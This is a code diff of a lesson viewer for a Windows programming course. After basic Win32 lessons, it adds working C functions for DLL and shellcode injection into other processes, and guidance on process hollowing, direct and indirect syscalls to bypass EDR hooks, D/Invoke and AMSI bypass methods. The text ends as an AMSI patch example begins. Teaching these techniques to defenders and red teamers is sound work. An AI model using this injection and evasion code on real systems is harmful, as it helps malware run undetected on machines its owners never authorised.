@@ -19,32 +19,16 @@ const LessonViewer = ({ moduleId }: LessonViewerProps) => {
         },
         {
           title: "Windows Data Types - Why They Matter",
-          content: `Think of Windows data types as a special language Microsoft created to make sure programs work correctly on all computers (old and new, 32-bit and 64-bit).
+          content: `Think of Windows data types as a special language Microsoft created to make sure programs work correctly on all computers.
 
 **The Problem:** If you use regular 'int', it might be different sizes on different computers.
 **The Solution:** Windows types like DWORD are ALWAYS the same size everywhere.`,
           tip: `Think of these types as "guaranteed sizes" - DWORD is ALWAYS 32 bits, no matter what computer you're on.`,
           concepts: [
-            {
-              label: "BYTE",
-              explanation: "8 bits (0-255) - Use for small numbers or single characters"
-            },
-            {
-              label: "WORD",
-              explanation: "16 bits (0-65,535) - Rarely used today"
-            },
-            {
-              label: "DWORD",
-              explanation: "32 bits - Most common, use for IDs, sizes, counts"
-            },
-            {
-              label: "QWORD",
-              explanation: "64 bits - Use for very large numbers"
-            },
-            {
-              label: "HANDLE",
-              explanation: "A reference ticket to a Windows resource (file, process, etc.)"
-            }
+            { label: "BYTE", explanation: "8 bits (0-255) - Use for small numbers or single characters" },
+            { label: "WORD", explanation: "16 bits (0-65,535) - Rarely used today" },
+            { label: "DWORD", explanation: "32 bits - Most common, use for IDs, sizes, counts" },
+            { label: "HANDLE", explanation: "A reference ticket to a Windows resource (file, process, etc.)" }
           ],
           example: {
             title: "Simple Example - Using Windows Types",
@@ -54,391 +38,1222 @@ const LessonViewer = ({ moduleId }: LessonViewerProps) => {
 
 int main() {
     // Process ID - use DWORD
-    DWORD processId = 1234;
-    
-    // File size - use DWORD for sizes
-    DWORD fileSize = 2048;  // 2 KB
+    DWORD processId = GetCurrentProcessId();
+    printf("My PID: %lu\\n", processId);
     
     // Handle to a file
     HANDLE hFile = CreateFileW(
-        L"test.txt",              // File name
-        GENERIC_READ,             // We want to read
-        FILE_SHARE_READ,          // Others can read too
-        NULL,                     // Security (default)
-        OPEN_EXISTING,            // File must exist
-        FILE_ATTRIBUTE_NORMAL,    // Normal file
-        NULL                      // No template
+        L"test.txt",
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
     );
     
-    // Always check if it worked!
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("Failed to open file!\\n");
         return 1;
     }
     
-    printf("File opened successfully!\\n");
-    
-    // IMPORTANT: Always close handles!
+    printf("File opened!\\n");
     CloseHandle(hFile);
-    
     return 0;
 }`,
             language: "c"
           },
-          warning: `Never forget to call CloseHandle()! If you don't close handles, your program will leak resources and eventually fail.`
+          warning: `Never forget to call CloseHandle()! If you don't close handles, your program will leak resources.`
         },
         {
-          title: "Handles - Your Access Tickets to Windows",
+          title: "Handles - Your Access Tickets",
           content: `A HANDLE is like a ticket that Windows gives you to use something. You can't access Windows resources directly (that would be unsafe!), so Windows gives you a "ticket" instead.
 
 **Real World Analogy:**
-Think of a coat check at a restaurant:
-• You give them your coat
+• You give a coat check your coat
 • They give you a ticket (HANDLE)
-• You can't go behind the counter (security!)
 • When you show the ticket, they give you your coat back
-• The ticket is only valid in that restaurant (process)
-
-Windows handles work the same way!`,
-          tip: `Handles are like claim tickets - they're only valid in your program. A handle from one program won't work in another program.`,
+• The ticket is only valid in that location`,
+          tip: `Handles are like claim tickets - they're only valid in your program.`,
           example: {
             title: "Working with Process Handles",
-            description: "Let's open another process and work with it:",
             code: `#include <windows.h>
 #include <stdio.h>
 
 int main() {
-    // Step 1: Get the Process ID you want to work with
     DWORD targetPID = 1234;  // Replace with real PID
     
-    // Step 2: Ask Windows for a handle to that process
-    printf("[*] Opening process %lu...\\n", targetPID);
-    
     HANDLE hProcess = OpenProcess(
-        PROCESS_QUERY_INFORMATION,  // What we want to do
-        FALSE,                      // Don't inherit to child processes
-        targetPID                   // Which process
+        PROCESS_QUERY_INFORMATION,
+        FALSE,
+        targetPID
     );
     
-    // Step 3: Check if it worked
     if (hProcess == NULL) {
-        // Get the error code
         DWORD error = GetLastError();
-        printf("[ERROR] Failed! Error code: %lu\\n", error);
-        
-        // Common errors:
+        printf("Failed! Error: %lu\\n", error);
         if (error == 5) {
-            printf("  -> Access Denied. Try running as Administrator.\\n");
+            printf("Access Denied - try Administrator\\n");
         }
         return 1;
     }
     
-    printf("[SUCCESS] Got handle: 0x%p\\n", hProcess);
-    
-    // Step 4: Do something with it
-    // (Query information, read memory, etc.)
-    
-    // Step 5: ALWAYS close the handle when done!
+    printf("Got handle: 0x%p\\n", hProcess);
     CloseHandle(hProcess);
-    printf("[*] Handle closed. All done!\\n");
-    
     return 0;
 }`,
             language: "c"
-          },
-          concepts: [
-            {
-              label: "HANDLE",
-              explanation: "A reference to a Windows object (file, process, thread, etc.)"
-            },
-            {
-              label: "OpenProcess",
-              explanation: "Gets a handle to an existing process"
-            },
-            {
-              label: "CloseHandle",
-              explanation: "Releases the handle when you're done"
-            },
-            {
-              label: "GetLastError",
-              explanation: "Gets the error code when something fails"
-            }
-          ]
+          }
         },
         {
-          title: "Error Handling - When Things Go Wrong",
-          content: `In Windows programming, things fail ALL THE TIME. A file doesn't exist, you don't have permission, a process ended, etc. You MUST check for errors!
+          title: "Error Handling",
+          content: `In Windows programming, things fail ALL THE TIME. You MUST check for errors!
 
 **The Pattern:**
 1. Call a Windows function
 2. Check if it failed
-3. Call GetLastError() to find out why
-4. Handle the error appropriately`,
-          warning: `Never ignore return values! If you don't check for errors, your program will crash in mysterious ways.`,
+3. Call GetLastError() to find out why`,
+          warning: `Never ignore return values! If you don't check for errors, your program will crash.`,
           example: {
             title: "Proper Error Handling",
-            description: "Always check return values and handle errors:",
             code: `#include <windows.h>
 #include <stdio.h>
 
-// Helper function to print error messages
-void PrintError(const char* operation) {
+void PrintError(const char* op) {
     DWORD error = GetLastError();
-    printf("[ERROR] %s failed with error %lu\\n", operation, error);
-    
-    // Get Windows' description of the error
-    char* message = NULL;
-    FormatMessageA(
-        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
-        NULL,
-        error,
-        0,
-        (LPSTR)&message,
-        0,
-        NULL
-    );
-    
-    if (message) {
-        printf("  Description: %s\\n", message);
-        LocalFree(message);
-    }
+    printf("[ERROR] %s failed: %lu\\n", op, error);
 }
 
 int main() {
-    // Example: Try to open a file
     HANDLE hFile = CreateFileW(
         L"nonexistent.txt",
-        GENERIC_READ,
-        FILE_SHARE_READ,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL
+        GENERIC_READ, 0, NULL,
+        OPEN_EXISTING, 0, NULL
     );
     
-    // Check if it failed
     if (hFile == INVALID_HANDLE_VALUE) {
         PrintError("CreateFile");
-        
-        DWORD error = GetLastError();
-        if (error == ERROR_FILE_NOT_FOUND) {
-            printf("\\n[TIP] The file doesn't exist!\\n");
-        } else if (error == ERROR_ACCESS_DENIED) {
-            printf("\\n[TIP] You don't have permission!\\n");
-        }
-        
         return 1;
     }
     
-    // Success path
-    printf("[SUCCESS] File opened!\\n");
     CloseHandle(hFile);
     return 0;
 }`,
             language: "c"
           },
-          tip: `Common error codes: ERROR_SUCCESS (0), ERROR_ACCESS_DENIED (5), ERROR_FILE_NOT_FOUND (2), ERROR_INVALID_PARAMETER (87)`
+          tip: `Common error codes: ERROR_ACCESS_DENIED (5), ERROR_FILE_NOT_FOUND (2), ERROR_INVALID_PARAMETER (87)`
+        }
+      ]
+    },
+    "windows-internals": {
+      title: "Windows Internals & Win32 API",
+      description: "Master Windows architecture, processes, threads, and the Win32 API",
+      sections: [
+        {
+          type: "intro",
+          content: `Welcome to Windows Internals! Here you'll learn how Windows really works under the hood - processes, threads, memory, and the powerful Win32 API.`
         },
         {
-          title: "Strings - ASCII vs Unicode",
-          content: `Windows has TWO types of strings because it supports all languages worldwide:
+          title: "Process Architecture",
+          content: `A process is like a container for a running program. It has its own memory space, handles, and one or more threads.
 
-**ASCII (CHAR, LPSTR):**
-• 1 byte per character
-• Only English and basic characters
-• Old way, still used sometimes
-
-**Unicode (WCHAR, LPWSTR):**
-• 2 bytes per character  
-• Supports ALL languages (Chinese, Arabic, Emoji, etc.)
-• Modern way - USE THIS!`,
-          tip: `Always use Unicode (wide strings with 'W' suffix). Put 'L' before string literals: L"Hello"`,
+**What makes up a process:**
+• Virtual address space (memory)
+• Executable code
+• Open handles to system objects
+• Security context (token)
+• One or more threads of execution`,
+          concepts: [
+            { label: "Process", explanation: "A container for code execution with its own memory space" },
+            { label: "Thread", explanation: "The actual unit that executes code - a process has at least one" },
+            { label: "PEB", explanation: "Process Environment Block - contains process info like loaded DLLs" },
+            { label: "TEB", explanation: "Thread Environment Block - per-thread data structure" }
+          ],
           example: {
-            title: "String Examples",
-            description: "Working with both types of strings:",
+            title: "Get Process Information",
+            description: "Query basic process information:",
             code: `#include <windows.h>
 #include <stdio.h>
 
 int main() {
-    // ASCII string (old way)
-    const char* asciiStr = "Hello";
-    printf("ASCII: %s\\n", asciiStr);
+    // Get our own process info
+    DWORD pid = GetCurrentProcessId();
+    HANDLE hProcess = GetCurrentProcess();
     
-    // Unicode string (modern way) - note the L prefix!
-    const wchar_t* unicodeStr = L"Hello 世界 🌍";
-    wprintf(L"Unicode: %s\\n", unicodeStr);
+    printf("Process ID: %lu\\n", pid);
+    printf("Handle: 0x%p\\n", hProcess);
     
-    // Windows API - most functions have A and W versions
+    // Query memory info
+    PROCESS_MEMORY_COUNTERS pmc;
+    pmc.cb = sizeof(pmc);
     
-    // MessageBoxA - ASCII version
-    MessageBoxA(NULL, "ASCII Message", "Title", MB_OK);
-    
-    // MessageBoxW - Unicode version (USE THIS!)
-    MessageBoxW(NULL, L"Unicode Message 你好", L"Title", MB_OK);
-    
-    // File operations with Unicode
-    HANDLE hFile = CreateFileW(  // Note the W suffix!
-        L"test_文件.txt",         // Filename with Chinese characters
-        GENERIC_WRITE,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL
-    );
-    
-    if (hFile != INVALID_HANDLE_VALUE) {
-        printf("File created with Unicode name!\\n");
-        CloseHandle(hFile);
+    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
+        printf("Working Set: %llu KB\\n", 
+            pmc.WorkingSetSize / 1024);
+        printf("Page Faults: %lu\\n", 
+            pmc.PageFaultCount);
     }
     
     return 0;
 }`,
             language: "c"
+          }
+        },
+        {
+          title: "Enumerating Processes",
+          content: `One of the most common tasks is listing all running processes. The Toolhelp API makes this easy.
+
+**Steps:**
+1. Create a snapshot of the system
+2. Loop through all processes
+3. Get details from PROCESSENTRY32`,
+          tip: `Always set pe32.dwSize = sizeof(pe32) before calling Process32First - this is a very common bug!`,
+          example: {
+            title: "List All Processes",
+            code: `#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+int main() {
+    HANDLE hSnap = CreateToolhelp32Snapshot(
+        TH32CS_SNAPPROCESS, 0
+    );
+    
+    if (hSnap == INVALID_HANDLE_VALUE) {
+        printf("Snapshot failed\\n");
+        return 1;
+    }
+    
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(pe32);  // IMPORTANT!
+    
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            wprintf(L"[%5lu] %s\\n", 
+                pe32.th32ProcessID,
+                pe32.szExeFile);
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    
+    CloseHandle(hSnap);
+    return 0;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Virtual Memory",
+          content: `Windows uses virtual memory - each process thinks it has its own private memory space. The OS maps virtual addresses to physical RAM.
+
+**Key concepts:**
+• Each process has 4GB (32-bit) or 128TB (64-bit) virtual space
+• Pages are 4KB chunks of memory
+• Memory can be Reserved, Committed, or Free`,
+          concepts: [
+            { label: "VirtualAlloc", explanation: "Allocates memory in your process" },
+            { label: "VirtualAllocEx", explanation: "Allocates memory in another process" },
+            { label: "VirtualProtect", explanation: "Changes memory protection (RWX permissions)" },
+            { label: "VirtualFree", explanation: "Releases allocated memory" }
+          ],
+          example: {
+            title: "Allocate and Use Memory",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Allocate 4KB of memory
+    LPVOID mem = VirtualAlloc(
+        NULL,                    // Let Windows choose
+        4096,                    // Size in bytes
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE           // Read/write access
+    );
+    
+    if (!mem) {
+        printf("Allocation failed\\n");
+        return 1;
+    }
+    
+    printf("Allocated at: 0x%p\\n", mem);
+    
+    // Use the memory
+    strcpy((char*)mem, "Hello, Memory!");
+    printf("Content: %s\\n", (char*)mem);
+    
+    // Free the memory
+    VirtualFree(mem, 0, MEM_RELEASE);
+    return 0;
+}`,
+            language: "c"
           },
-          warning: `Always match string types! Don't mix char* with WCHAR*. Use the 'W' version of Windows functions with Unicode strings.`
+          warning: `Always free memory you allocate! Memory leaks can crash long-running programs.`
         }
       ]
     },
-    // windows-internals: {
-    //   title: "Windows Internals",
-    //   description: "Delve into the heart of the Windows operating system",
-    //   sections: [
-    //     {
-    //       title: "Processes and Threads",
-    //       content: `Processes are the containers for running programs, while threads are the units of execution within a process.`,
-    //       example: {
-    //         title: "Creating a Thread",
-    //         description: "Example of creating a simple thread in C++:",
-    //         code: `#include <iostream>
-    // #include <thread>
+    "process-injection": {
+      title: "Process Injection & Memory",
+      description: "Advanced memory manipulation and process injection techniques",
+      sections: [
+        {
+          type: "intro",
+          content: `Process injection allows you to execute code in another process's context. This is used for debugging, security tools, and unfortunately, by malware. Understanding these techniques is crucial for both offense and defense.`
+        },
+        {
+          title: "Classic DLL Injection",
+          content: `The most common injection technique. You write the path to a DLL in the target process, then create a thread that calls LoadLibrary.
+
+**Steps:**
+1. OpenProcess with appropriate rights
+2. VirtualAllocEx - allocate memory for the DLL path
+3. WriteProcessMemory - write the DLL path
+4. CreateRemoteThread - call LoadLibraryA`,
+          concepts: [
+            { label: "OpenProcess", explanation: "Get a handle with VM_WRITE and THREAD rights" },
+            { label: "VirtualAllocEx", explanation: "Allocate memory in target process" },
+            { label: "WriteProcessMemory", explanation: "Write data to target process" },
+            { label: "CreateRemoteThread", explanation: "Create a thread in target process" }
+          ],
+          warning: `This technique is heavily monitored by security products. Don't run on systems you don't own!`,
+          example: {
+            title: "DLL Injection Steps",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+BOOL InjectDLL(DWORD pid, const char* dllPath) {
+    // Step 1: Open the target process
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS, FALSE, pid
+    );
+    if (!hProcess) return FALSE;
     
-    // void task() {
-    //     std::cout << "Thread is running" << std::endl;
-    // }
+    // Step 2: Allocate memory for DLL path
+    size_t pathLen = strlen(dllPath) + 1;
+    LPVOID remoteMem = VirtualAllocEx(
+        hProcess, NULL, pathLen,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    if (!remoteMem) {
+        CloseHandle(hProcess);
+        return FALSE;
+    }
     
-    // int main() {
-    //     std::thread t(task);
-    //     t.join();
-    //     return 0;
-    // }`,
-    //         language: "cpp"
-    //       }
-    //     },
-    //     {
-    //       title: "Memory Management",
-    //       content: `Windows uses virtual memory to manage memory allocation for processes.`,
-    //       example: {
-    //         title: "Allocating Memory",
-    //         description: "Example of allocating memory using VirtualAlloc:",
-    //         code: `#include <iostream>
-    // #include <windows.h>
+    // Step 3: Write DLL path to target
+    WriteProcessMemory(
+        hProcess, remoteMem,
+        dllPath, pathLen, NULL
+    );
     
-    // int main() {
-    //     LPVOID addr = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    //     if (addr == NULL) {
-    //         std::cerr << "Failed to allocate memory" << std::endl;
-    //         return 1;
-    //     }
-    //     std::cout << "Memory allocated at: " << addr << std::endl;
-    //     VirtualFree(addr, 0, MEM_RELEASE);
-    //     return 0;
-    // }`,
-    //         language: "cpp"
-    //       }
-    //     }
-    //   ]
-    // },
-    // networking: {
-    //   title: "Networking with WinAPI",
-    //   description: "Learn how to create network applications using WinAPI",
-    //   sections: [
-    //     {
-    //       title: "Sockets",
-    //       content: `Sockets are endpoints for network communication.`,
-    //       example: {
-    //         title: "Creating a Socket",
-    //         description: "Example of creating a socket in C++:",
-    //         code: `#include <iostream>
-    // #include <winsock2.h>
+    // Step 4: Create remote thread
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)LoadLibraryA,
+        remoteMem, 0, NULL
+    );
     
-    // #pragma comment(lib, "ws2_32.lib")
+    if (hThread) {
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
     
-    // int main() {
-    //     WSADATA wsaData;
-    //     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-    //         std::cerr << "Failed to initialize Winsock" << std::endl;
-    //         return 1;
-    //     }
+    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    return hThread != NULL;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Shellcode Injection",
+          content: `Instead of loading a DLL, you can inject raw shellcode (position-independent code) directly.
+
+**The difference:**
+• DLL Injection: Loads a file from disk (leaves traces)
+• Shellcode Injection: Everything in memory (stealthier)`,
+          tip: `Shellcode must be position-independent - it can't rely on fixed addresses because you don't know where it will land.`,
+          example: {
+            title: "Basic Shellcode Injection",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+BOOL InjectShellcode(DWORD pid, BYTE* code, SIZE_T size) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS, FALSE, pid
+    );
+    if (!hProcess) return FALSE;
     
-    //     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-    //     if (s == INVALID_SOCKET) {
-    //         std::cerr << "Failed to create socket" << std::endl;
-    //         WSACleanup();
-    //         return 1;
-    //     }
+    // Allocate executable memory
+    LPVOID remoteMem = VirtualAllocEx(
+        hProcess, NULL, size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE  // RWX for code
+    );
     
-    //     std::cout << "Socket created" << std::endl;
-    //     closesocket(s);
-    //     WSACleanup();
-    //     return 0;
-    // }`,
-    //         language: "cpp"
-    //       }
-    //     },
-    //     {
-    //       title: "HTTP Requests",
-    //       content: `You can use WinAPI to make HTTP requests.`,
-    //       example: {
-    //         title: "Making an HTTP Request",
-    //         description: "Example of making an HTTP request using WinHTTP:",
-    //         code: `#include <iostream>
-    // #include <winhttp.h>
+    if (!remoteMem) {
+        CloseHandle(hProcess);
+        return FALSE;
+    }
     
-    // #pragma comment(lib, "winhttp.lib")
+    // Write shellcode
+    WriteProcessMemory(
+        hProcess, remoteMem,
+        code, size, NULL
+    );
     
-    // int main() {
-    //     HINTERNET hSession = WinHttpOpen(L"WinHTTP Example", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    //     if (hSession == NULL) {
-    //         std::cerr << "Failed to open WinHTTP session" << std::endl;
-    //         return 1;
-    //     }
+    // Execute it
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)remoteMem,
+        NULL, 0, NULL
+    );
     
-    //     HINTERNET hConnect = WinHttpConnect(hSession, L"example.com", INTERNET_DEFAULT_HTTP_PORT, 0);
-    //     if (hConnect == NULL) {
-    //         std::cerr << "Failed to connect to server" << std::endl;
-    //         WinHttpCloseHandle(hSession);
-    //         return 1;
-    //     }
+    if (hThread) CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return hThread != NULL;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Process Hollowing",
+          content: `Process hollowing creates a suspended process, unmaps its memory, and replaces it with malicious code.
+
+**Why use it?**
+• The process looks legitimate (e.g., notepad.exe)
+• But it's running your code
+• Great for evading process monitoring`,
+          concepts: [
+            { label: "CREATE_SUSPENDED", explanation: "Create process but don't run it yet" },
+            { label: "NtUnmapViewOfSection", explanation: "Remove the original code" },
+            { label: "VirtualAllocEx", explanation: "Allocate space for new code" },
+            { label: "SetThreadContext", explanation: "Point execution to your code" }
+          ],
+          warning: `Process hollowing is a well-known technique. Modern EDRs detect the unmapping and rewriting patterns.`
+        }
+      ]
+    },
+    syscalls: {
+      title: "Syscalls & Native API",
+      description: "Direct syscall invocation and NTDLL internals",
+      sections: [
+        {
+          type: "intro",
+          content: `Syscalls are the gateway between user-mode and kernel-mode. Understanding them lets you bypass user-mode hooks that security products use for monitoring.`
+        },
+        {
+          title: "What are Syscalls?",
+          content: `When you call a Windows API function, it eventually needs to talk to the kernel. This happens through syscalls.
+
+**The chain:**
+1. Your code calls WriteFile()
+2. kernel32.dll does setup
+3. ntdll.dll makes the actual syscall
+4. Kernel does the work
+
+**Why care?**
+Security products hook ntdll.dll to monitor API calls. If you make syscalls directly, you bypass their hooks!`,
+          concepts: [
+            { label: "SSN", explanation: "System Service Number - the syscall's ID number" },
+            { label: "ntdll.dll", explanation: "The bridge between user-mode and kernel" },
+            { label: "syscall", explanation: "x64 instruction that transitions to kernel" },
+            { label: "sysenter", explanation: "x86 instruction for the same purpose" }
+          ],
+          example: {
+            title: "Finding Syscall Numbers",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+// Find the syscall number for an Nt function
+DWORD GetSSN(LPCSTR functionName) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return -1;
     
-    //     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    //     if (hRequest == NULL) {
-    //         std::cerr << "Failed to open HTTP request" << std::endl;
-    //         WinHttpCloseHandle(hConnect);
-    //         WinHttpCloseHandle(hSession);
-    //         return 1;
-    //     }
+    FARPROC func = GetProcAddress(ntdll, functionName);
+    if (!func) return -1;
     
-    //     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
-    //         if (WinHttpReceiveResponse(hRequest, NULL)) {
-    //             std::cout << "HTTP request successful" << std::endl;
-    //         } else {
-    //             std::cerr << "Failed to receive response" << std::endl;
-    //         }
-    //     } else {
-    //         std::cerr << "Failed to send request" << std::endl;
-    //     }
+    BYTE* bytes = (BYTE*)func;
     
-    //     WinHttpCloseHandle(hRequest);
-    //     WinHttpCloseHandle(hConnect);
-    //     WinHttpCloseHandle(hSession);
-    //     return 0;
-    // }`,
-    //         language: "cpp"
-    //       }
-    //     }
-    //   ]
-    // }
+    // x64 syscall stub pattern:
+    // 4C 8B D1    mov r10, rcx
+    // B8 XX XX    mov eax, SSN
+    
+    printf("First 8 bytes of %s:\\n", functionName);
+    for (int i = 0; i < 8; i++) {
+        printf("%02X ", bytes[i]);
+    }
+    printf("\\n");
+    
+    // SSN is at offset 4
+    return *(DWORD*)(bytes + 4) & 0xFFFF;
+}
+
+int main() {
+    DWORD ssn = GetSSN("NtAllocateVirtualMemory");
+    printf("SSN: %lu (0x%X)\\n", ssn, ssn);
+    return 0;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Direct Syscalls",
+          content: `Direct syscalls mean you make the syscall instruction yourself, completely bypassing ntdll.dll.
+
+**The challenge:**
+SSN numbers change between Windows versions! You need to find them dynamically.
+
+**Common approaches:**
+1. Read them from ntdll.dll at runtime
+2. Use Hell's Gate technique
+3. Have a lookup table for each Windows version`,
+          tip: `Hell's Gate and Halo's Gate are techniques to find SSNs even when ntdll is hooked by reading neighboring functions.`,
+          example: {
+            title: "Direct Syscall in Assembly",
+            description: "What a direct syscall looks like:",
+            code: `; x64 direct syscall
+mov r10, rcx          ; Windows calling convention
+mov eax, 0x18         ; SSN for NtAllocateVirtualMemory
+syscall               ; Transition to kernel
+ret
+
+; The SSN (0x18) varies by Windows version!
+; Windows 10 1909: 0x18
+; Windows 10 2004: 0x18  
+; Windows 11: might be different
+
+; In C, you'd use inline assembly or a separate .asm file`,
+            language: "asm"
+          },
+          warning: `Direct syscalls look suspicious. EDRs are now detecting the syscall instruction itself when it comes from unexpected locations.`
+        },
+        {
+          title: "Indirect Syscalls",
+          content: `To avoid detection of syscall instructions in your code, you can jump to the syscall in ntdll.dll itself!
+
+**How it works:**
+1. Set up registers like normal
+2. Jump to the syscall instruction IN ntdll.dll
+3. Kernel sees the call coming from ntdll (looks legit)`,
+          concepts: [
+            { label: "Direct", explanation: "syscall instruction in YOUR code" },
+            { label: "Indirect", explanation: "Jump to syscall in ntdll.dll" },
+            { label: "Syswhispers", explanation: "Tool that generates syscall stubs" }
+          ]
+        }
+      ]
+    },
+    pinvoke: {
+      title: "P/Invoke & .NET Interop",
+      description: "C# unmanaged code interop and marshalling",
+      sections: [
+        {
+          type: "intro",
+          content: `P/Invoke (Platform Invocation Services) lets C# call native Windows API functions. It's the bridge between managed .NET code and unmanaged Windows code.`
+        },
+        {
+          title: "P/Invoke Basics",
+          content: `To call a Windows function from C#, you declare it with the DllImport attribute.
+
+**Key things to get right:**
+• The DLL name
+• The exact function name (case-sensitive!)
+• Parameter types (C types → C# types)
+• Return type`,
+          concepts: [
+            { label: "DllImport", explanation: "Attribute that declares a native function" },
+            { label: "extern", explanation: "Keyword indicating external implementation" },
+            { label: "IntPtr", explanation: "C# type for pointers and handles" },
+            { label: "Marshal", explanation: "Class for data conversion between managed/unmanaged" }
+          ],
+          example: {
+            title: "Basic P/Invoke Examples",
+            code: `using System;
+using System.Runtime.InteropServices;
+
+class Program {
+    // Simple function - no parameters
+    [DllImport("kernel32.dll")]
+    static extern uint GetCurrentProcessId();
+    
+    // Function with parameters
+    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+    static extern int MessageBoxW(
+        IntPtr hWnd,
+        string text,
+        string caption,
+        uint type
+    );
+    
+    // Function returning a handle
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr OpenProcess(
+        uint access,
+        bool inheritHandle,
+        uint processId
+    );
+    
+    static void Main() {
+        uint pid = GetCurrentProcessId();
+        Console.WriteLine($"My PID: {pid}");
+        
+        MessageBoxW(IntPtr.Zero, 
+            "Hello from C#!", "P/Invoke", 0);
+    }
+}`,
+            language: "csharp"
+          },
+          tip: `Always use SetLastError = true if you need to call Marshal.GetLastWin32Error() to get error codes.`
+        },
+        {
+          title: "Structure Marshalling",
+          content: `When Windows functions use structures, you need to define matching C# structs with the right layout.
+
+**Key attributes:**
+• [StructLayout(LayoutKind.Sequential)] - fields in order
+• [MarshalAs(...)] - control how fields are converted`,
+          example: {
+            title: "Marshalling Structures",
+            code: `using System;
+using System.Runtime.InteropServices;
+
+// Match the Windows PROCESSENTRY32W structure
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+struct PROCESSENTRY32W {
+    public uint dwSize;
+    public uint cntUsage;
+    public uint th32ProcessID;
+    public IntPtr th32DefaultHeapID;
+    public uint th32ModuleID;
+    public uint cntThreads;
+    public uint th32ParentProcessID;
+    public int pcPriClassBase;
+    public uint dwFlags;
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
+    public string szExeFile;
+}
+
+class Program {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateToolhelp32Snapshot(
+        uint flags, uint processId);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern bool Process32FirstW(
+        IntPtr snapshot, ref PROCESSENTRY32W entry);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern bool Process32NextW(
+        IntPtr snapshot, ref PROCESSENTRY32W entry);
+    
+    static void Main() {
+        IntPtr snap = CreateToolhelp32Snapshot(0x2, 0);
+        
+        var entry = new PROCESSENTRY32W();
+        entry.dwSize = (uint)Marshal.SizeOf(entry);
+        
+        if (Process32FirstW(snap, ref entry)) {
+            do {
+                Console.WriteLine(
+                    $"[{entry.th32ProcessID}] {entry.szExeFile}");
+            } while (Process32NextW(snap, ref entry));
+        }
+    }
+}`,
+            language: "csharp"
+          }
+        },
+        {
+          title: "D/Invoke - Dynamic Invocation",
+          content: `D/Invoke loads functions dynamically at runtime instead of using static P/Invoke. This helps evade static analysis.
+
+**Why use D/Invoke?**
+• P/Invoke declarations are visible in the binary
+• Static analysis tools can see what APIs you use
+• D/Invoke resolves functions at runtime`,
+          concepts: [
+            { label: "GetProcAddress", explanation: "Finds a function in a loaded DLL" },
+            { label: "GetModuleHandle", explanation: "Gets handle to already-loaded DLL" },
+            { label: "Delegates", explanation: "C# function pointers used to call the resolved function" }
+          ],
+          warning: `D/Invoke is well-known now. Sophisticated EDRs monitor for dynamic resolution patterns.`
+        }
+      ]
+    },
+    evasion: {
+      title: "Evasion Techniques",
+      description: "AV/EDR bypass and anti-analysis methods",
+      sections: [
+        {
+          type: "intro",
+          content: `Evasion techniques help code avoid detection by security products. Understanding these is essential for both red teamers and defenders.`
+        },
+        {
+          title: "AMSI Bypass",
+          content: `AMSI (Antimalware Scan Interface) lets Windows Defender scan scripts before execution. PowerShell, VBScript, and .NET use it.
+
+**Common bypass methods:**
+1. Patch AmsiScanBuffer to return "clean"
+2. Unload the AMSI DLL
+3. Null out the AMSI context`,
+          concepts: [
+            { label: "AMSI", explanation: "Antimalware Scan Interface - scans scripts" },
+            { label: "AmsiScanBuffer", explanation: "The function that does the scanning" },
+            { label: "Patching", explanation: "Overwriting function code to change behavior" }
+          ],
+          example: {
+            title: "AMSI Patch Concept",
+            description: "How AMSI patching works (educational):",
